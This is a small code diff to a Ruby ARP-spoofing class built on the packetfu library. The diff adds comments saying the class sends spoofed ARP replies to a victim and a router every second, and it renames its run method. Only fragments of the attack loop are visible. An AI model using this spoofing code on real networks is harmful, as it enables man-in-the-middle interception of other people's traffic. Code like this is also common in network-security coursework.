@@ -1,7 +1,18 @@
+=begin
+ File: arpSpoof.rb
+ Author: Luke Queenan
+=end
+
 # Gems
 require 'rubygems'
 require 'packetfu'
 
+=begin
+ This class handles the ARP spoofing portion of the application. It is designed
+ to send out spoofed ARP packets to the victim and router every 1 second. The 
+ class should be run in its own process and remotely killed when it is no longer
+ needed.
+=end
 class ArpSpoof
     
     def initialize (routerIP, routerMAC, victimIP, victimMAC, interface, ourInfo)
@@ -30,7 +41,7 @@ class ArpSpoof
         @arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
     end
     
-    def runspoof
+    def main
 
         # Run until we get killed by the parent, sending out packets
         while true
